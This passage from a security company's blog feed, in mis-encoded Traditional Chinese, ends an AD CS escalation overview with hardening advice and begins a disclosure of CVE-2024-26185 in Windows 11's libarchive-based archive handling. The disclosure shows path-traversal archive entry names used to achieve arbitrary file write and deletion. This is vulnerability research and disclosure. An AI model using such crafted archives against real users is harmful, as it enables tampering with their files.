      &lt;td&gt;é€éå¯«å…¥ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;altSecurityIdentities&lt;/code&gt; å¯é”æˆå¸³è™Ÿæ¥ç®¡ï¼Œä¸¦è©³ç´°è§£é‡‹äº† certificate mapping çš„æ©Ÿåˆ¶&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2024/11&lt;/td&gt;
      &lt;td&gt;&lt;a href=&quot;https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc&quot;&gt;ESC15 EKUwu&lt;/a&gt; CVE-2024-49019&lt;/td&gt;
      &lt;td&gt;ç™¼ç”Ÿåœ¨é è¨­çš„èˆŠç‰ˆæ†‘è­‰ç¯„æœ¬ä½¿ç”¨è€…å¯æ·»åŠ è‡ªè¨‚çš„ Application Policiesï¼Œåƒ…éœ€ç”³è«‹æ¬Šé™ä¾¿å¯ææ¬Š&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;çµèª&quot;&gt;çµèª&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;AD CS æ‡‰ç´å…¥ &lt;strong&gt;Tier 0 ä¿è­·&lt;/strong&gt;ï¼Œæ¯å€‹ç´°ç¯€æœƒå½±éŸ¿ä½ çš„ç¶²åŸŸå®‰å…¨ï¼ŒåŒ…å«å‚™ä»½æ“ä½œç­‰ã€‚ä¼æ¥­è—éšŠæ‡‰è€ƒæ…®ï¼š
    &lt;ul&gt;
      &lt;li&gt;å®šæœŸæª¢æ ¸æ‰€æœ‰æ†‘è­‰ç¯„æœ¬&lt;/li&gt;
      &lt;li&gt;åœç”¨æ‰€æœ‰å»¢æ£„çš„æ†‘è­‰ç¯„æœ¬&lt;/li&gt;
      &lt;li&gt;æª¢æ ¸æ†‘è­‰ç¯„æœ¬æ¬Šé™è¨­å®š&lt;/li&gt;
      &lt;li&gt;é«˜é¢¨éšªæ†‘è­‰å•Ÿç”¨ç®¡ç†å“¡æˆæ¬Šç”³è«‹&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¶²è·¯éš”é›¢å¾ˆé‡è¦&lt;/strong&gt;ï¼Œåƒ…å…è¨±éœ€è¦çš„é€£ç·šï¼Œå¯å¤§å¹…ç¸®å°æ”»æ“Šé¢åŠé§­å®¢å¯æ´»å‹•çš„ç©ºé–“&lt;/li&gt;
  &lt;li&gt;å–®ä¸€çš„é˜²ç¦¦æ©Ÿåˆ¶ä¸¦ä¸ä¸€å®šèƒ½æœçµ•å…¥ä¾µï¼Œæ‡‰&lt;strong&gt;æ€è€ƒæ˜¯å¦æœ‰å¯èƒ½çš„æ–¹å¼&lt;/strong&gt;å¯ä»¥ç¹éé˜²ç¦¦é™åˆ¶ï¼Œæˆ–æ˜¯è®“æˆ‘å€‘å¹«ä½ æƒ³å§ï¼&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://conf.devco.re/2024/keynote/DEVCORE-CONFERENCE-2024-Vtim-Taking-down-AD-in-minutes-things-that-you-missed-about-AD.pdf&quot;&gt;åˆ†åˆ†é˜æ‹¿ä¸‹æ•´å€‹ç¶²åŸŸ: é—œæ–¼ ADï¼Œä½ é‚„ç–å¿½äº†ä»€éº¼ï¼Ÿ&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf&quot;&gt;Certified Pre-Owned: Abusing Active Directory Certificate Services&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c&quot;&gt;From DA to EA with ESC5&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn786436(v=ws.11)&quot;&gt;Securing PKI: Planning a CA Hierarchy&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab&quot;&gt;Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6&quot;&gt;Certipy 2.0: BloodHound, New Escalations, Shadow Credentials, Golden Certificates, and more!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4&quot;&gt;Certifried: Active Directory Domain Privilege Escalation (CVE-2022â€“26923)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16&quot;&gt;KB5014754: Certificate-based authentication changes on Windows domain controllers&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7&quot;&gt;Certipy 4.0: ESC9 &amp;amp; ESC10, BloodHound GUI, New Authentication and Request Methods â€” and more!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d&quot;&gt;Certificates and Pwnage and Patches, Oh My!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/?ref=heartburn.dev&quot;&gt;Relaying to AD Certificate Services over RPC&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm&quot;&gt;ESC12 â€“ Shell access to ADCS CA with YubiHSM&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53&quot;&gt;ADCS ESC13 Abuse Technique&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9&quot;&gt;ADCS ESC14 Abuse Technique&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc&quot;&gt;EKUwu: Not just another AD CS ESC&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
                <link>https://devco.re/blog/2025/04/10/taking-over-the-entire-domain-in-minutes-what-have-you-overlooked-in-active-directory/</link>
                <guid>https://devco.re/blog/2025/04/10/taking-over-the-entire-domain-in-minutes-what-have-you-overlooked-in-active-directory</guid>
                <pubDate>Thu, 10 Apr 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å…¨å¢ƒæ“´æ•£ï¼šå¾ Windows 11 åˆ° Libarchive çš„ Half-Day å¨è„…èˆ‡å…¨é¢å½±éŸ¿</title>
                <description>&lt;h2 id=&quot;æ‘˜è¦&quot;&gt;æ‘˜è¦&lt;/h2&gt;
&lt;p&gt;Windows 11 åœ¨ 2023 å¹´ 10 æœˆç™¼å¸ƒçš„æ›´æ–°ä¸­ï¼Œæ–°å¢äº†å° RARã€7z ç­‰å¤šé” 11 ç¨®å£“ç¸®æ ¼å¼çš„æ”¯æ´ï¼Œä½¿ç”¨è€…å¯ä»¥åœ¨åŸç”Ÿçš„æª”æ¡ˆç¸½ç®¡å…§æ“ä½œé€™äº›æ ¼å¼çš„æª”æ¡ˆï¼Œå¤§å¹…æå‡äº†ä¾¿åˆ©æ€§ã€‚ç„¶è€Œï¼Œé€™ä¸€æ”¹é€²åŒæ™‚ä¹Ÿå¼•å…¥äº†æ½›åœ¨çš„è³‡å®‰é¢¨éšªã€‚Windows 11 ä½¿ç”¨è€ç‰Œé–‹æºå°ˆæ¡ˆ libarchive ä¾†å¯¦ç¾å¤šç¨®å£“ç¸®æ ¼å¼çš„æ”¯æ´ï¼Œè©²å°ˆæ¡ˆè¢«å»£æ³›ä½¿ç”¨åœ¨ Linuxã€BSDã€macOS ç­‰ä½œæ¥­ç³»çµ±ï¼Œä»¥åŠ ClickHouseã€Homebrewã€Osquery ç­‰ç­‰çŸ¥åå¤§å‹å°ˆæ¡ˆä¸­ã€‚è‡ª 2016 èµ·ï¼ŒGoogle çš„ OSS-Fuzz å°ˆæ¡ˆä¾¿ 24 å°æ™‚ä¸é–“æ–·åœ°å°å…¶é€²è¡Œæ¨¡ç³Šæ¸¬è©¦ï¼Œæ˜¯æ­·ç¶“æ™‚é–“è€ƒé©—çš„å‡½å¼åº«ã€‚&lt;/p&gt;

&lt;p&gt;ç„¶è€Œï¼Œåœ¨ OSS-Fuzz åŸ·è¡Œçš„æ¨¡ç³Šæ¸¬è©¦ä¸­ï¼Œlibarchive çš„è¦†è“‹ç‡ä¸¦ä¸ç†æƒ³ã€‚é™¤äº† Microsoft Offensive Research &amp;amp; Security Engineering (MORSE) åœ¨ 2024 å¹´ 1 æœˆè‡ªè¡Œæ­éœ²çš„å…©å€‹é ç«¯ç¨‹å¼ç¢¼åŸ·è¡Œæ¼æ´ï¼ˆRCEï¼‰ä¹‹å¤–ï¼Œæˆ‘å€‘ä»é€éç¨‹å¼ç¢¼å¯©æŸ¥èˆ‡æ¨¡ç³Šæ¸¬è©¦ç™¼ç¾äº† libarchive ä¸­çš„æ•¸å€‹å¼±é»ã€‚å…¶ä¸­åŒ…æ‹¬ä½æ–¼ RAR è§£å£“ç¸®ç¨‹å¼ç¢¼ä¸­çš„ Heap Buffer Overflow æ¼æ´ï¼Œä»¥åŠå›  Windows æœªå° libarchive çš„åŸ·è¡Œçµæœé€²è¡Œå¦¥å–„æª¢æŸ¥ï¼Œå°è‡´çš„ä»»æ„æª”æ¡ˆå¯«å…¥å’Œä»»æ„æª”æ¡ˆåˆªé™¤çš„æ¼æ´ã€‚æ­¤å¤–ï¼Œæˆ‘å€‘ä¹Ÿå°‡åœ¨æœ¬æ–‡ä¸­æ­éœ² libarchive èˆ‡ Windows çµåˆå¾Œç”¢ç”Ÿçš„è«¸å¤šç¥å¥‡ç‰¹æ€§ã€‚&lt;/p&gt;

&lt;p&gt;è€Œæ¯ç•¶ libarchive é€™é¡å»£æ³›ä½¿ç”¨çš„å‡½å¼åº«å­˜åœ¨å¼±é»æ™‚ï¼Œå…¶é¢¨éšªå¾€å¾€æ»²é€åˆ°å„å€‹å±¤é¢ï¼Œå½±éŸ¿é›£ä»¥ä¼°è¨ˆã€‚åŠ ä¸Šç•¶ Microsoft ç‚º Windows é€²è¡Œä¿®è£œæ™‚ï¼Œç›¸æ‡‰çš„ patch ä¸¦ä¸æœƒç«‹å³å›é¥‹åˆ° libarchive ä¸­ï¼Œé€™ä½¿å¾—æ”»æ“Šè€…èƒ½å¤ é€šéåˆ†æ patch æ‰¾å‡ºæ¼æ´ä½ç½®ï¼Œä¸¦åœ¨æ¼æ´ä¿®è£œçš„ç©ºçª—æœŸï¼Œåˆ©ç”¨è©²æ¼æ´å°å…¶ä»–ä½¿ç”¨ libarchive çš„å°ˆæ¡ˆé€²è¡Œæ”»æ“Šã€‚æ‰€ä»¥æœ€å¾Œï¼Œæˆ‘å€‘å°‡ä»¥ ClickHouse ç‚ºä¾‹ï¼Œèªªæ˜å¦‚ä½•åœ¨ libarchive å°šæœªç²å¾—ä¿®è£œæ™‚ï¼Œåœ¨çœ‹ä¼¼ä¸å—å½±éŸ¿çš„ ClickHouse ä¸­è§¸ç™¼å°šæœªä¿®è£œçš„æ¼æ´ã€‚&lt;/p&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;åœ¨ Windows 11 çš„ KB5031455 æ›´æ–°ä¹‹å‰ï¼ŒWindows åŸç”Ÿåƒ…æ”¯æ´ ZIP æ ¼å¼çš„å£“ç¸®æª”æ¡ˆã€‚ZIP åœ¨æª”æ¡ˆç¸½ç®¡ä¸­é¡¯ç¤ºçš„é¡å‹æ˜¯ã€ŒCompressed (zipped) Folderã€ï¼Œä½¿ç”¨è€…å¯ä»¥ç›´æ¥é»å…©ä¸‹ ZIP ä¾†æŸ¥çœ‹å…¶åŒ…å«ä»€éº¼æª”æ¡ˆï¼Œç”šè‡³å¯ä»¥ç›´æ¥é–‹å•Ÿæª”æ¡ˆæˆ–æ˜¯åŠ å…¥æ–°çš„æª”æ¡ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ã€ŒCompressed (zipped) Folderã€è®“ä½¿ç”¨è€…å¯ä»¥åœ¨ä¸è§£å£“ç¸®çš„æƒ…æ³ä¸‹ç€è¦½å£“ç¸®æª”æ¡ˆå…§çš„æ¸…å–®ï¼Œä¸¦ä¸”å°æª”æ¡ˆé»å…©ä¸‹å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚ç›´æ¥é»æ“Šå…©ä¸‹é–‹å•Ÿæ–‡å­—æª”æ¡ˆï¼š
&lt;img src=&quot;/assets/img/blog/20250212/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é€™æ˜¯å› ç‚ºç•¶ä½¿ç”¨è€…é»å…©ä¸‹å£“ç¸®æª”æ¡ˆå…§çš„æª”æ¡ˆæ™‚ï¼Œæª”æ¡ˆç¸½ç®¡æœƒå°‡è©²æª”æ¡ˆè§£å£“ç¸®åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; ç›®éŒ„ä¸‹çš„ä¸€å€‹ä»¥éš¨æ©Ÿ UUID å‘½åçš„æš«å­˜è³‡æ–™å¤¾ä¸­ï¼Œå¯¦éš›ä¸Šæ˜¯å¾è©²æš«å­˜ä½ç½®é–‹å•Ÿæª”æ¡ˆã€‚ç”±æ–¼é€™æ˜¯æš«å­˜æª”æ¡ˆï¼Œç¨å¾Œæœƒè‡ªå‹•åˆªé™¤ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;compressed-archived-folder&quot;&gt;Compressed Archived folder&lt;/h3&gt;

&lt;p&gt;æ¥è‘—ï¼ŒWindows 11 åœ¨ 2023 å¹´ 10 æœˆçš„ KB5031455 æ›´æ–°ä¹‹å¾Œæ”¯æ´äº† 11 ç¨®æ–°çš„å£“ç¸®æª”æ¡ˆæ ¼å¼ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ­¤é¡çš„æª”æ¡ˆåœ¨æª”æ¡ˆç¸½ç®¡ä¸­é¡¯ç¤ºçš„é¡å‹æ˜¯ã€ŒCompressed Archive Folderã€ï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼éå¸¸å¥½å¥‡ Windows 11 æ˜¯é€éä»€éº¼æ–¹å¼ä¾†æ”¯æ´é€™ 11 ç¨®æ–°çš„å£“ç¸®æ ¼å¼ï¼Œæˆ‘å€‘é–‹å§‹åˆ†ææª”æ¡ˆç¸½ç®¡ä»¥åŠç›¸é—œçš„ DLL æª”æ¡ˆã€‚æª”æ¡ˆç¸½ç®¡å° ZIP çš„åŸç”Ÿæ”¯æ´æ˜¯ç”± &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; é€™æ”¯ DLL æ‰€è² è²¬çš„ã€‚åœ¨ KB5031455 æ›´æ–°ä¹‹å¾Œï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; ä¸­å¤šå‡ºäº†ä¸€å€‹å«åš &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveFolder&lt;/code&gt; çš„ Classï¼Œæœ‰åˆ¥æ–¼åŸæœ¬ç”¨ä»¥æ”¯æ´ ZIP çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CZipFolder&lt;/code&gt; Classã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ç¬¬ä¸€å€‹æ¼æ´cve-2024-26185&quot;&gt;ç¬¬ä¸€å€‹æ¼æ´ï¼šCVE-2024-26185&lt;/h3&gt;

&lt;p&gt;åœ¨é€²è¡Œé€†å‘åˆ†æä¹‹å‰ï¼Œæˆ‘å€‘é¦–å…ˆå°æ–°çš„ã€ŒCompressed Archive Folderã€é€²è¡Œäº†ç°¡å–®çš„é»‘ç®±æ¸¬è©¦ã€‚è¬›åˆ°å£“ç¸®æª”æ¡ˆï¼Œé‚£çµ•å°è¦æ¸¬è©¦ä¸€ä¸‹ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt;ã€‚&lt;/p&gt;

&lt;p&gt;ç¬¬ä¸€æ¬¡æ¸¬è©¦ï¼Œæˆ‘å€‘æ§‹é€ ä¸€å€‹åç¨±ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt; çš„æª”æ¡ˆï¼Œä¸¦å£“ç¸®æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt;ï¼Œæ¥è‘—ä¸Šå‚³è‡³ Windows ä¸»æ©Ÿå¾Œé»å…©ä¸‹é€²è¡Œç€è¦½ã€‚çµæœæ˜¯ï¼Œæˆ‘å€‘åƒ…æœƒåœ¨æª”æ¡ˆç¸½ç®¡ä¸­çœ‹åˆ°ä¸€å€‹ç©ºçš„è³‡æ–™å¤¾ï¼Œä¸¦æ²’æœ‰é€ æˆä»»ä½• Path Traversalï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç¬¬äºŒæ¬¡æ¸¬è©¦ï¼Œæ§‹é€ ä¸€å€‹åç¨±ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; çš„æª”æ¡ˆï¼Œä¸¦å£“ç¸®æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rar&lt;/code&gt;ï¼Œä¸Šå‚³è‡³ Windows ä¸»æ©Ÿå¾Œé»å…©ä¸‹é€²è¡Œç€è¦½ã€‚å› ç‚º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..&lt;/code&gt; èˆ‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123&lt;/code&gt; æŠµéŠ·çš„é—œä¿‚ï¼Œåªæœƒåœ¨æª”æ¡ˆç¸½ç®¡ä¸­çœ‹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; ä¸€å€‹æª”æ¡ˆï¼š&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è€Œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; ä¸­å°æ‡‰çš„æš«å­˜æª”æ¡ˆä¹Ÿä¸¦æœªé€ƒé€¸è‡³ä¸Šå±¤ç›®éŒ„ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é™¤äº†é»å…©ä¸‹äº’å‹•ä¹‹å¤–ï¼Œåœ¨æª”æ¡ˆç¸½ç®¡ä¸­å°ã€ŒCompressed (zipped) Folderã€æˆ–æ˜¯ ã€ŒCompressed Archive Folderã€é¡å‹çš„æª”æ¡ˆæŒ‰å³éµå¯ä»¥çœ‹åˆ° &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; çš„é¸é …ï¼Œé€™å€‹é¸é …æœƒå˜—è©¦å°‡æ•´å€‹å£“ç¸®æª”æ¡ˆè§£å£“ç¸®ï¼Œé€éé€™å€‹é¸é …æˆ‘å€‘å†é€²è¡Œä¸€æ¬¡æ¸¬è©¦ã€‚&lt;/p&gt;

&lt;p&gt;é€™æ¬¡ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;..\poc.txt&lt;/code&gt; è¢«èªç‚ºæœƒé€ƒé€¸åˆ°ä¸Šå±¤ç›®éŒ„ï¼Œæ‰€ä»¥æª”æ¡ˆç¸½ç®¡çµ¦å‡ºä¸€å€‹ Errorï¼š
&lt;img src=&quot;/assets/img/blog/20250212/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;123\..\poc.txt&lt;/code&gt; å‰‡è§£å£“ç¸®æˆåŠŸï¼Œä½†ä¸€æ¨£åªæœƒè§£å£“ç¸®å‡º &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt;
&lt;img src=&quot;/assets/img/blog/20250212/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; æ˜¯ç›´æ¥è§£å£“ç¸®æ•´å€‹æª”æ¡ˆï¼Œå› æ­¤æˆ‘å€‘èªç‚ºã€Œç•¶æª”æ¡ˆåŒ…å«çµ•å°è·¯å¾‘æ™‚ã€ä¹Ÿéœ€è¦æ¸¬è©¦ä¸€ä¸‹ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¯ä»¥ç™¼ç¾ï¼Œé€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Extract All&lt;/code&gt; è§£å£“ç¸®ç¢ºå¯¦æœ‰åŒ…å«è³‡æ–™å¤¾ï¼Œä¸éï¼Œè³‡æ–™å¤¾ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; è¢«é‡æ–°å‘½åæˆäº† &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt; è³‡æ–™å¤¾ã€‚å› æ­¤æˆ‘å€‘å¯ä»¥çŸ¥é“ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; æœ‰å°ç‰¹æ®Šå­—å…ƒé€²è¡Œè™•ç†ä¾†é¿å…è§£å£“ç¸®æ™‚çš„ Path Traversal èˆ‡ Arbitrary File Writeã€‚
&lt;img src=&quot;/assets/img/blog/20250212/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†ç•¶æˆ‘å€‘ã€Œé»å…©ä¸‹ã€åŒ…å«çµ•å°è·¯å¾‘çš„ RAR æª”æ¡ˆé€²è¡Œæ¸¬è©¦æ™‚ï¼Œå»çœ‹åˆ°ä¸€å€‹å«åš &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Local Disk (C:)&lt;/code&gt; çš„è³‡æ–™å¤¾ï¼&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; ä¸¦æ²’æœ‰è¢«æ›¿æ›æˆ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C_&lt;/code&gt;ï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœæˆ‘å€‘é€²åˆ°è³‡æ–™å¤¾çš„æœ€å…§å±¤ï¼Œä¸¦ä¸”æŠŠ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; æª”æ¡ˆæ‰“é–‹ï¼Œçœ‹ä¼¼ä¸€åˆ‡æ­£å¸¸ï¼š
&lt;img src=&quot;/assets/img/blog/20250212/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä½†å…¶å¯¦ï¼Œ&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; ä¸‹å¤šå‡ºäº†ä¸æ‡‰è©²å­˜åœ¨çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; è³‡æ–™å¤¾ï¼
&lt;img src=&quot;/assets/img/blog/20250212/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¡¨ç¤ºæª”æ¡ˆç¸½ç®¡èª¤èªç‚ºæ­¤è™•æ˜¯ç”¨ä¾†æš«æ”¾æª”æ¡ˆçš„åœ°æ–¹ï¼Œå› æ­¤ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; è³‡æ–™å¤¾ä¸­ä¹ŸåŒ…å«æˆ‘å€‘å‰›æ‰æ‰“é–‹çš„ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; æª”æ¡ˆï¼š
&lt;img src=&quot;/assets/img/blog/20250212/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ä¹Ÿå°±æ˜¯èªªï¼Œæˆ‘å€‘æ‰¾åˆ°äº†ä¸€å€‹ Arbitrary File Write çš„æ¼æ´ï¼ä¸”ç”±æ–¼å¯«å…¥çš„ç›®çš„æ˜¯æ”¾ç½®æš«å­˜æª”æ¡ˆä¾†é€²è¡Œäº’å‹•ï¼Œæ‰€ä»¥åœ¨ç¶“éä¸€æ®µæ™‚é–“æˆ–æ˜¯ä½¿ç”¨è€…çµæŸç€è¦½æ™‚å°±æœƒè¢«åˆªé™¤ï¼Œå› æ­¤æˆ‘å€‘å¯¦éš›ä¸Šæ‰¾åˆ°çš„æ˜¯ä¸€å€‹ä»»æ„æª”æ¡ˆå¯«/åˆªé™¤çš„æ¼æ´ã€‚ä¸éç¨å¾®ç¨å¾®å¯æƒœçš„æ˜¯ï¼Œä»»æ„æª”æ¡ˆå¯«èˆ‡ä»»æ„æª”æ¡ˆåˆªé™¤æ‰€ä½¿ç”¨çš„æ¬Šé™æ˜¯ç•¶å‰ä½¿ç”¨è€…çš„æ¬Šé™ã€‚&lt;/p&gt;

&lt;p&gt;é€™å°±æ˜¯ &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26185&quot;&gt;CVE-2024-26185&lt;/a&gt;ï¼šä¸€å€‹å¥½ç¬‘ä½†æ²’ä»€éº¼ç”¨è™•çš„æ¼æ´ã€‚å› ç‚ºå¦‚æœè¦åˆ©ç”¨æ­¤æ¼æ´å‰µå»ºæˆ–åˆªé™¤ç‰¹å®šä½ç½®çš„æª”æ¡ˆï¼Œé‚£å°±å¿…é ˆåœ¨å£“ç¸®æª”ä¸­å»ºç«‹å‡ºç›¸åŒçš„è·¯å¾‘ï¼Œæ¥è‘—é‚„éœ€è¦èª˜é¨™ä½¿ç”¨è€…æ‰“é–‹æ‰€æœ‰è³‡æ–™å¤¾å¾Œï¼Œé»æ“Šå…©ä¸‹ç›®æ¨™æª”æ¡ˆæ‰è¡Œï¼Œæ­£å¸¸äººé»åˆ°ä¸€åŠå°±æœƒè¦ºå¾—å“ªè£¡æ€ªæ€ªçš„äº†ã€‚&lt;/p&gt;

&lt;p&gt;è©±æ˜¯é€™éº¼èªªï¼Œä½†æ ¹æ“šè¦å‰‡ï¼Œå¾®è»Ÿé‚„æ˜¯å¾—ä»˜æˆ‘ 1,000 ç¾é‡‘ï¼Œå¥½è€¶ã€‚
&lt;img src=&quot;/assets/img/blog/20250212/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26185æˆå› &quot;&gt;CVE-2024-26185ï¼šæˆå› &lt;/h3&gt;

&lt;p&gt;å‰›æ‰ç™¼ç¾çš„ CVE-2024-26185ï¼Œæˆå› æ˜¯å› ç‚ºæ²’æœ‰æ­£ç¢ºçš„å°æª”æ¡ˆåç¨±é€²è¡Œéæ¿¾ã€‚é€†å‘ä¹‹å¾Œæˆ‘å€‘ç™¼ç¾ï¼Œåœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; ä¸­ï¼Œé€²è¡Œè§£å£“ç¸®ä¹‹å‰æœƒå‘¼å« &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; é€²è¡Œéæ¿¾ã€‚é€™å€‹ function å°‡ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt; ç­‰å­—å…ƒæ›¿æ›ç‚º &lt;code class=&quot;language-plaintext 